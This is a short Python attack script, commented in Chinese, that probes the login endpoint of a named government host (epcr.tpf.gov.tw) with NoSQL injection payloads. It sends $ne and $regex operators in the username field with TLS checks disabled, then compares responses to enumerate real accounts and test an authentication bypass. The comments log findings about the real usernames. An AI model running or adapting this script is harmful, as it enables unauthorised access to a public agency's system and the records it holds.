import requests, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login_full(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    r=s.post(BASE+"/login", json=body, timeout=10)
    return r.status_code, r.headers.get("Content-Length"), r.text[:60]

print("=== 区分'用户存在+密码错' vs '用户不存在' 的响应差异 ===")
# 已知: 真实用户名是2个大写首字母不同的词. 用 $ne 匹配到2个 -> 403
# 用 $regex 匹配到1个真实用户 -> ? (若走密码校验则401/400, 若崩溃则500)
# 测试: 宽泛匹配(应含真实用户) vs 极窄(应0用户)
tests=[
  ("匹配>=2($ne)", {"username":{"$ne":None},"password":"WRONG","captcha":"1","domain":"AUTH_SERVER"}),
  ("匹配1个(A开头,大写)", {"username":{"$regex":"^A"},"password":"WRONG","captcha":"1","domain":"AUTH_SERVER"}),
  ("匹配0个(zzz不存在)", {"username":"ZZZQQQ","password":"WRONG","captcha":"1","domain":"AUTH_SERVER"}),
  ("匹配0个(regex无)", {"username":{"$regex":"^Z$"},"password":"WRONG","captcha":"1","domain":"AUTH_SERVER"}),
]
for tag,body in tests:
    sc,cl,tx=login_full(body); time.sleep(0.05)
    print(f"  {tag:28s} -> {sc} len={cl} {tx}")
